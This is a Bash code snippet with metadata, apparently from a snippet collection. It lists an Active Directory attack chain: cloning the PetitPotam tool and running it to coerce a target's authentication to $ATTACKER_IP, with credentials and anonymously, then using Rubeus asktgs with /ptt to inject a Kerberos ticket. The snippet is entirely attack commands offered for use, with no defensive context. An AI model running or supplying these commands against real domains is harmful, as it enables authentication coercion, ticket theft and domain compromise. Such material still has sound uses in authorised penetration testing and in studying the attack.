---
id: 09b036ee-ef4c-4db3-8fff-d52d6f82bf10
type: code
language: Bash
verified: false
created_at: '2023-04-06T03:56:07.618790+00:00'
updated_at: '2023-04-10T20:36:05.391865+00:00'
---

# Code Snippet 09b036ee

**Language**: Bash

```bash
# Coerce the callback
git clone https://github.com/topotam/PetitPotam
python3 petitpotam.py -d $DOMAIN -u $USER -p $PASSWORD $ATTACKER_IP $TARGET_IP
python3 petitpotam.py -d '' -u '' -p '' $ATTACKER_IP $TARGET_IP

# Extract the ticket
.\Rubeus.exe asktgs /ticket:<ticket base64> /ptt
```


